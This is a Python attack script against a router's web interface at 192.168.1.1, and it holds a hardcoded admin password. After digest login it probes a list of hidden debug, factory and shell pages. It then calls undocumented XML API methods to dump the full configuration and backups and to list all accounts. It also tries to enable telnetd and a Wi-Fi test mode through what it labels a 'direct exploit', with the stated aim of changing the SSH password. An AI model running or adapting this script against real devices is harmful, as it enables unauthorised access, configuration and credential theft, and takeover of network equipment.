#!/usr/bin/env python3
"""Try to dump full config, access hidden pages, and change SSH password"""
import hashlib, requests, socket, sys, time, random
requests.packages.urllib3.disable_warnings()

ROUTER_IP = "192.168.1.1"; ROUTER_URL = f"http://{ROUTER_IP}"
USER = "admin"; PASS = "Om@0Yt#5"
sess = requests.Session(); sess.verify = False; sess.timeout = 10

def login():
    r = sess.get(f"{ROUTER_URL}/login.cgi", timeout=10)
    ah = r.headers.get("WWW-Authenticate","")
    p = dict(part.split("=",1) for part in ah.replace("Digest ","").split(", "))
    for k in p: p[k] = p[k].strip('"')
    ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
    ha2 = hashlib.md5("GET:/cgi/xml_action.cgi".encode()).hexdigest()
    salt = str(random.randint(0,100000))+str(int(time.time()*1000))
    cn = hashlib.md5(salt.encode()).hexdigest()[:16]
    resp = hashlib.md5(f"{ha1}:{p['nonce']}:00000001:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
    r2 = sess.get(f"{ROUTER_URL}/login.cgi?Action=Digest&username={USER}&realm={p['realm']}&nonce={p['nonce']}&response={resp}&qop={p['qop']}&cnonce={cn}&nc=00000001&temp=marvell", timeout=10)
    ok = "CGISID:" in r2.text
    print(f"[Login] {'OK' if ok else 'FAIL'}")
    return ok

def api(xml):
    r = sess.get(f"{ROUTER_URL}/login.cgi", timeout=10)
    ah = r.headers.get("WWW-Authenticate","")
    p = dict(part.split("=",1) for part in ah.replace("Digest ","").split(", "))
    for k in p: p[k] = p[k].strip('"')
    api.nc = getattr(api, "nc", 0) + 1
    ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
    ha2 = hashlib.md5("POST:/cgi/xml_action.cgi".encode()).hexdigest()
    salt = str(random.randint(0,100000))+str(int(time.time()*1000))
    cn = hashlib.md5(salt.encode()).hexdigest()[:16]
    resp = hashlib.md5(f"{ha1}:{p['nonce']}:{api.nc:08d}:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
    auth = f'Digest username="{USER}", realm="{p["realm"]}", nonce="{p["nonce"]}", uri="/cgi/xml_action.cgi", response="{resp}", qop={p["qop"]}, nc={api.nc:08d}, cnonce="{cn}"'
    try:
        r = sess.post(f"{ROUTER_URL}/xml_action.cgi?method=set",
                      data=xml, headers={"Authorization": auth, "csrftoken": "hfiehifejfklihefiuehflejhfueihfeuihfeui", "Content-Type": "application/xml"}, timeout=10)
        return r.text if r.text else "(empty)"
    except Exception as e:
        return f"ERROR: {e}"

login()

print("\n=== Hidden pages ===")
for page in ["/eng.html", "/Fact.htm", "/factory.html", "/debug.html", "/telnet.html",
             "/backup.html", "/restore.html", "/diag.html", "/system.html",
             "/cgi-bin/", "/webFac", "/eng_mode.htm", "/password.html",
             "/hidden.html", "/adv.html", "/advanced.html", "/dev.html",
             "/test.html", "/cmd.html", "/shell.html", "/exec.html",
             "/cgi-bin/telephone", "/cgi-bin/webs", "/cgi-bin/webcm",
             "/AT.htm", "/at.html", "/diag.htm"]:
    try:
        r = sess.get(f"{ROUTER_URL}{page}", timeout=5, allow_redirects=False)
        if r.status_code == 200 and len(r.text) > 50:
            print(f"  [{r.status_code}] {page} ({len(r.text)} bytes)")
        elif r.status_code != 404 and r.status_code != 301:
            print(f"  [{r.status_code}] {page} ({len(r.text) if r.text else 0}b)")
    except:
        pass

print("\n=== API discovery ===")
# Try to get full config
print("\n[*] get_all_config_info:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>get_all_config_info</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try backup config
print("\n[*] backup_config:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>backup_config</obj_method></param></RGW>''')
print(f"  {r[:200] if len(r)<200 else '(binary, '+str(len(r))+' bytes)'}")

# Try backup_config via cm
print("\n[*] cm backup_config:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>cm</obj_path><obj_method>backup_config</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try config/backup
print("\n[*] config backup:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>config</obj_path><obj_method>backup</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try get all accounts
print("\n[*] get_all_accounts:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>account</obj_path><obj_method>get_all_accounts</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try to list all available methods
print("\n[*] list_methods (router):")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>router</obj_path><obj_method>list_methods</obj_method></param></RGW>''')
print(f"  {r[:400]}")

print("\n[*] list_methods (cm):")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>cm</obj_path><obj_method>list_methods</obj_method></param></RGW>''')
print(f"  {r[:400]}")

print("\n[*] list_methods (system):")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>system</obj_path><obj_method>list_methods</obj_method></param></RGW>''')
print(f"  {r[:400]}")

print("\n[*] list_methods (wireless):")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>wireless</obj_path><obj_method>list_methods</obj_method></param></RGW>''')
print(f"  {r[:400]}")

print("\n[*] list_methods (version):")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>version</obj_path><obj_method>list_methods</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try get_web_info
print("\n[*] get_web_info from web object:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>web</obj_path><obj_method>get_web_info</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try to get iptv/voip/other info
print("\n[*] cm get_all_info:")
r = api('''<?xml version="1.0"?><RGW><param><method>call</method><session>000</session>
<obj_path>cm</obj_path><obj_method>get_all_info</obj_method></param></RGW>''')
print(f"  {r[:400]}")

# Try old simple format with auth
print("\n=== Simple XML format w/ auth ===")
simple_xmls = [
    ('wifi_ate_enable', '<?xml version="1.0" encoding="utf-8"?><xml_version>1.0</xml_version><xml_request><wifi_ate_enable></wifi_ate_enable></xml_request>'),
    ('telnetd', '<?xml version="1.0" encoding="utf-8"?><xml_version>1.0</xml_version><xml_request><telnetd></telnetd></xml_request>'),
    ('set_sys_mode', '<?xml version="1.0" encoding="utf-8"?><xml_version>1.0</xml_version><xml_request><set_sys_mode><mode>1</mode></set_sys_mode></xml_request>'),
]
for name, xml in simple_xmls:
    print(f"\n[*] {name}:")
    r = sess.get(f"{ROUTER_URL}/login.cgi", timeout=10)
    ah = r.headers.get("WWW-Authenticate","")
    p = dict(part.split("=",1) for part in ah.replace("Digest ","").split(", "))
    for k in p: p[k] = p[k].strip('"')
    api.nc = getattr(api, "nc", 0) + 1
    ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
    ha2 = hashlib.md5("POST:/cgi/xml_action.cgi".encode()).hexdigest()
    salt = str(random.randint(0,100000))+str(int(time.time()*1000))
    cn = hashlib.md5(salt.encode()).hexdigest()[:16]
    resp = hashlib.md5(f"{ha1}:{p['nonce']}:{api.nc:08d}:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
    auth = f'Digest username="{USER}", realm="{p["realm"]}", nonce="{p["nonce"]}", uri="/cgi/xml_action.cgi", response="{resp}", qop={p["qop"]}, nc={api.nc:08d}, cnonce="{cn}"'
    try:
        r = sess.post(f"{ROUTER_URL}/xml_action.cgi?method=set",
                      data=xml, headers={"Authorization": auth, "csrftoken": "hfiehifejfklihefiuehflejhfueihfeuihfeui", "Content-Type": "application/xml"}, timeout=10)
        print(f"  {r.status_code}: {r.text[:200] if r.text else '(empty)'}")
    except Exception as e:
        print(f"  ERROR: {e}")

# Try the exploit URL directly (without RGW format)
print("\n=== Direct exploit ===")
r = sess.get(f"{ROUTER_URL}/login.cgi", timeout=10)
ah = r.headers.get("WWW-Authenticate","")
p = dict(part.split("=",1) for part in ah.replace("Digest ","").split(", "))
for k in p: p[k] = p[k].strip('"')
api.nc = getattr(api, "nc", 0) + 1
ha1 = hashlib.md5(f"{USER}:{p['realm']}:{PASS}".encode()).hexdigest()
ha2 = hashlib.md5("POST:/cgi/xml_action.cgi?method=set&obj=wireless&method=wifi_ate_enable".encode()).hexdigest()
salt = str(random.randint(0,100000))+str(int(time.time()*1000))
cn = hashlib.md5(salt.encode()).hexdigest()[:16]
resp = hashlib.md5(f"{ha1}:{p['nonce']}:{api.nc:08d}:{cn}:{p['qop']}:{ha2}".encode()).hexdigest()
auth = f'Digest username="{USER}", realm="{p["realm"]}", nonce="{p["nonce"]}", uri="/cgi/xml_action.cgi?method=set&obj=wireless&method=wifi_ate_enable", response="{resp}", qop={p["qop"]}, nc={api.nc:08d}, cnonce="{cn}"'
for url_suffix in ["/xml_action.cgi?method=set&obj=wireless&method=wifi_ate_enable",
                    "/xml_action.cgi?method=set&obj=wireless&attr=wifi_ate_enable"]:
    try:
        r = sess.post(f"{ROUTER_URL}{url_suffix}", data="",
                      headers={"Authorization": auth, "csrftoken": "hfiehifejfklihefiuehflejhfueihfeuihfeui"}, timeout=10)
        print(f"  {url_suffix}: {r.status_code} {r.text[:200] if r.text else '(empty)'}")
    except Exception as e:
        print(f"  {url_suffix}: ERROR: {e}")

print("\nDone.")
